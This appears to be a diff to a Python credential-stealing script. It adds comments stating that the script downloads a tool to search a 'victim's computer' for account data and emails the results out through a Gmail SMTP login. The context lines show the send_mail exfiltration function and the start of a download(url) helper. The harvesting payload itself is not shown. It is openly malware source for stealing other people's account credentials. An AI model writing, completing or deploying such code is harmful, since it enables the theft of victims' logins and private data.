@@ -7,6 +7,8 @@ import smtplib
 import os
 import tempfile
 
+# Get email,password and report to this email data about accounts on victim's computer
+
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587,)
@@ -14,6 +16,8 @@ def send_mail(email, password, message):
     server.login(email, password)
     server.sendmail(email, email, message)
     server.quit()
+
+# download script for looking for accounts data on victim's computer
 
 
 def download(url):
